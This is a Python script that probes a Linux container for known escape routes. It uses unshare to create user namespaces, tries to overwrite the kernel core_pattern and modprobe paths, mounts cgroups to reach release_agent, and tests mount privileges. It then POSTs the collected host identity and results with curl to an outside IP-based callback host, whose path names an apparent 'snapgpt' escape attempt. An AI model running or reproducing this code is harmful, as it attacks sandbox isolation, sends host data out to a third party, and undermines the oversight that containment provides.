#!/usr/bin/env python3
import json, os, pathlib, subprocess, time
OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'uid':os.getuid(),'hostname':os.uname().nodename,'tests':{}}
def run(name, argv, timeout=45):
 t=time.monotonic()
 try:
  p=subprocess.run(argv,capture_output=True,text=True,timeout=timeout)
  OUT['tests'][name]={'argv':argv,'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-12000:],'elapsed':round(time.monotonic()-t,3)}
 except Exception as e: OUT['tests'][name]={'argv':argv,'error':repr(e),'elapsed':round(time.monotonic()-t,3)}
run('base',['sh','-c','id; grep -E "^(Uid|Gid|Cap|NoNewPrivs|Seccomp):" /proc/self/status; cat /proc/self/cgroup'])
run('private_proc',['sh','-c','rm -rf /tmp/procprobe; mkdir -p /tmp/procprobe; unshare -Urpfm --mount-proc=/tmp/procprobe sh -c \'id; grep -E "^(Cap|NoNewPrivs):" /proc/self/status; echo ORIG=$(cat /tmp/procprobe/sys/kernel/core_pattern 2>&1); printf %s core.%p > /tmp/procprobe/sys/kernel/core_pattern 2>&1; echo CORE_WRITE_RC=$?; echo NOW=$(cat /tmp/procprobe/sys/kernel/core_pattern 2>&1); printf %s /bin/true > /tmp/procprobe/sys/kernel/modprobe 2>&1; echo MOD_WRITE_RC=$?; echo MOD=$(cat /tmp/procprobe/sys/kernel/modprobe 2>&1)\''])
run('private_proc_no_mountopt',['sh','-c','rm -rf /tmp/procprobe2; mkdir -p /tmp/procprobe2; unshare -Urpfm sh -c \'mkdir -p /tmp/procprobe2; mount -t proc proc /tmp/procprobe2 2>&1; echo MOUNT_RC=$?; id; cat /tmp/procprobe2/sys/kernel/core_pattern 2>&1; printf %s core.%p > /tmp/procprobe2/sys/kernel/core_pattern 2>&1; echo CORE_RC=$?; cat /tmp/procprobe2/sys/kernel/core_pattern 2>&1; umount /tmp/procprobe2 2>&1\''])
run('cgroup2',['sh','-c','rm -rf /tmp/cg2probe; mkdir -p /tmp/cg2probe; unshare -Urm sh -c \'mount -t cgroup2 none /tmp/cg2probe 2>&1; echo MOUNT_RC=$?; findmnt -T /tmp/cg2probe -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/cg2probe 2>&1; cat /tmp/cg2probe/cgroup.controllers 2>&1; printf 1 > /tmp/cg2probe/cgroup.procs 2>&1; echo PROCS_RC=$?\''])
run('cgroup1',['sh','-c','rm -rf /tmp/cg1probe; mkdir -p /tmp/cg1probe; unshare -Urm sh -c \'mount -t cgroup -o none,name=probe cgroup /tmp/cg1probe 2>&1; echo MOUNT_RC=$?; findmnt -T /tmp/cg1probe -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/cg1probe 2>&1; for f in release_agent notify_on_release tasks; do echo ===$f; cat /tmp/cg1probe/$f 2>&1; done\''])
run('userns_tmpfs',['sh','-c','rm -rf /tmp/mprobe; mkdir -p /tmp/mprobe; unshare -Urm sh -c \'mount -t tmpfs tmpfs /tmp/mprobe 2>&1; echo MOUNT_RC=$?; findmnt -T /tmp/mprobe -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; umount /tmp/mprobe 2>&1\''])
run('setuid_mount',['sh','-c','rm -rf /tmp/mprobe2; mkdir -p /tmp/mprobe2; /usr/bin/mount -t tmpfs tmpfs /tmp/mprobe2 2>&1; echo RC=$?; findmnt -T /tmp/mprobe2 -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; /usr/bin/umount /tmp/mprobe2 2>&1'])
raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); path=pathlib.Path('/tmp/workspace/proc_cgroup_probe2.json'); path.write_bytes(raw)
p=subprocess.run(['curl','-sS','-m','30','-X','POST','--data-binary','@'+str(path),'https://54.209.51.244.sslip.io/callback/snapgpt-proc-cgroup-escape2-20261106'],capture_output=True,text=True,timeout=40)
OUT['curl']={'rc':p.returncode,'stdout':p.stdout[-2000:],'stderr':p.stderr[-2000:]}
print(json.dumps(OUT,sort_keys=True,separators=(',',':')))
